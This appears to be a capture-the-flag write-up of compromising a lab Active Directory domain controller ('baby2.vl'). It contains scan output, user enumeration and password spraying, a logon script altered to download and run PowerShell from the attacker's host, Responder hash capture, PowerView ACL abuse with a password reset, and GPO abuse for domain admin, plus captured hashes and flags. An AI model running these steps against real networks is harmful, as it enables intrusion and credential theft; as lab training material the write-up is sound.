**Scan** 
```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-31 13:04:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2024-07-31T12:53:02
|_Not valid after:  2025-07-31T12:53:02
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2024-07-31T12:53:02
|_Not valid after:  2025-07-31T12:53:02
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2024-07-31T12:53:02
|_Not valid after:  2025-07-31T12:53:02
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2024-07-31T12:53:02
|_Not valid after:  2025-07-31T12:53:02
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2024-07-30T13:02:12
|_Not valid after:  2025-01-29T13:02:12
| rdp-ntlm-info:
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-31T13:05:03+00:00
|_ssl-date: 2024-07-31T13:05:43+00:00; -1s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time:
|   date: 2024-07-31T13:05:04
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

```sh
netexec smb 10.10.65.99 -u "Guest" -p "" --shares
netexec smb $t -u " library" -p "library"

kerbrute userenum --dc $t -d baby2.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

```

```sh
grep -o '"samaccountname": "[^"]*"' 20240731155912_users.json | sed 's/"samaccountname": "\(.*\)"/\1/'
```
Users list : 
```sh
Amelia.Griffiths
library
Joel.Hurst
Lynda.Bailey
Nicola.Lamb
Kieran.Mitchell
Ryan.Jenkins
Carl.Moore
Joan.Jennings
Harry.Shaw
krbtgt
Mohammed.Harris
Administrator
Guest
gpoadm
```

```sh
netexec smb $t -u "user.txt" -p "user.txt" --no-bruteforce --continue-on-success
```

New creds : `Carl.Moore:Carl.Moore`

- Access to scripts folder and modify the logon.vbs and place a reverse shell .
```sh
Set objShell = CreateObject("WScript.Shell")

' Command to run PowerShell and execute the remote script
powerShellCmd = "powershell -c ""IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.3.12:80/shell.ps1')"""

' Run the PowerShell command
objShell.Run powerShellCmd, 1, True

#The port 80 was for the responder to grab some hash 
```

- Catch hash with #responder:

```sh
Responder.py -I tun0

[SMB] NTLMv1-SSP Client   : 10.10.64.174
[SMB] NTLMv1-SSP Username : BABY2\Amelia.Griffiths
[SMB] NTLMv1-SSP Hash     : Amelia.Griffiths::BABY2:D3444DD9B4F08BE400000000000000000000000000000000:29AF41240D2B1D9A17B06B5AD77BB1E5EB79D507D4F6DE8A:1122334455667788
```

User VL{36a82a40b7dce3fa5b07a0cc81a45d22}

ACL : 
```sh
Import-Module ./PowerView.ps1

Set-DomainObjectOwner -identity gpoadm -OwnerIdentity Amelia.Griffiths 

Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights ResetPassword 

$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force

Set-DomainUserPassword -identity gpoadm -accountpassword $cred
```

Tool: https://github.com/Hackndo/pyGPOAbuse.git

- GPO : 
```sh

#GPOabuse
pygpoabuse.py baby2.vl/gpoadm -hashes ":20DEF05980FC9E4C846AE5530963B573" -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip 10.10.109.95 

gpupdate /force

default creds  : john H4x00r123..

```

Root VL{f0205b652ed74c5deed92b7a6a163516}